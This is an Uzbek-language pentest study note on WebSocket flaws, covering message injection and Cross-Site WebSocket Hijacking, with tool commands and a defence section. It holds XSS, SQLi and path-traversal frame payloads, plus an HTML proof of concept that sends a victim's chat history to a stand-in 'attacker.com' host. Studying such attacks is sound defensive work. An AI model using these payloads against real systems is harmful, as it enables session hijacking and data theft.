# WebSockets Vulnerabilities

> Lab yechimlari (PortSwigger'ning 2 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
WebSocket (`ws://`/`wss://`) — brauzer va server orasida doimiy, ikki tomonlama kanal (chat, live
dashboard). Zaiflik ikki xil: (1) kanaldagi **xabarlar** oddiy HTTP input kabi tozalanmaydi →
XSS/SQLi/injection shu yerdan o'tadi; (2) WebSocket **handshake** CSRF token/origin tekshirmaydi →
boshqa sayt qurbon nomidan ulanib oladi (CSWSH).

**Ildiz sabab:** dasturchilar WebSocket'ni "ichki, ishonchli" deb o'ylab, HTTP'dagi himoyalarni
(input validation, CSRF himoya, origin check) unutadi. Natijada mavjud zaifliklar shu kanalga ko'chadi.

## Turlari
- **Message tampering** — xabar JSON/matnini o'zgartirib XSS/SQLi/injection yuborish.
- **CSWSH (Cross-Site WebSocket Hijacking)** — handshake CSRF himoyasiz → attacker sahifasidan
  qurbon cookie'si bilan ulanib, chat tarixi/maxfiy data o'g'irlash.
- **Handshake manipulation** — `X-Forwarded-For` bilan IP spoof, origin/auth bypass.

## Oqibatlar (IMPACT)
- **CSWSH** → qurbon nomidan ulanib chat tarixi/maxfiy ma'lumot o'g'irlash → ATO.
- Xabar orqali XSS (boshqa userга render) / SQLi / injection.
- Auth/authorization bypass.
> CSWSH sensitive data chiqarsa **High**.

## Qayerdan qidiriladi
Chat, jonli notification, live dashboard, collaborative editor, trading,
`Upgrade: websocket` so'rovlar. Burp → WebSockets history.

## 1. Xabar ichida injection
```json
{"message":"<img src=x onerror=alert(1)>"}   // XSS (boshqa userга render)
{"user":"admin'--","msg":"x"}                 // SQLi
{"id":"../../../etc/passwd"}                   // path traversal
```
> HTTP injectionlarning hammasini WebSocket frame'ga ham qo'llab ko'r.

## 2. CSWSH (eng muhim)
Handshake faqat cookie bilan auth qilinsa va `Origin` tekshirilmasa — sening sayting
qurbon nomidan ulanadi.
```html
<script>
  const ws = new WebSocket('wss://target.com/chat');
  ws.onopen = () => ws.send('{"action":"getHistory"}');
  ws.onmessage = e => fetch('https://attacker.com/log?d='+encodeURIComponent(e.data));
</script>
```
> Qurbon login turib bu sahifani ochsa — uning chat tarixi sening serveringga tushadi.

## Origin tekshiruvini sinash
```http
# Handshake'da:
Origin: https://evil.com
→ 101 Switching Protocols qaytsa → Origin tekshirilmaydi → CSWSH mumkin
```

## TOOLLAR

### Burp Repeater (WebSocket) — frame yuborish/o'zgartirish
```
Burp → WebSockets history → o'ng tugma → "Send to Repeater" → frame'ni tahrirla, yubor
```
> Har bir xabarga injection payloadni qo'lda joylab, javobni ko'rasan.

### websocat — CLI WebSocket client
```bash
websocat wss://target.com/chat
```
> Terminaldan to'g'ridan-to'g'ri ulanib, qo'lda xabar yuborasan (header, origin bilan o'ynash uchun).

### wsrepl — WebSocket fuzzing/avtomatizatsiya
```bash
wsrepl -u wss://target.com/chat
```
> Interaktiv WebSocket REPL — payload tez-tez yuborib, javobni kuzatasan.

### curl — handshake / Origin test
```bash
curl -s -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Origin: https://evil.com" -H "Sec-WebSocket-Key: x" -H "Sec-WebSocket-Version: 13" https://target.com/chat
```
> `101` qaytsa — Origin tekshirilmaydi, CSWSH yo'li ochiq.

## PoC
CSWSH: HTML PoC'ni qurbon ochganda uning sessiyasi bilan ma'lumot kelishini ko'rsat.

## Himoya
Handshake'da `Origin` allowlist, handshake'ga CSRF token, WebSocket xabarini HTTP kabi
validate/sanitize, per-message authorization, cookie'ga `SameSite`.
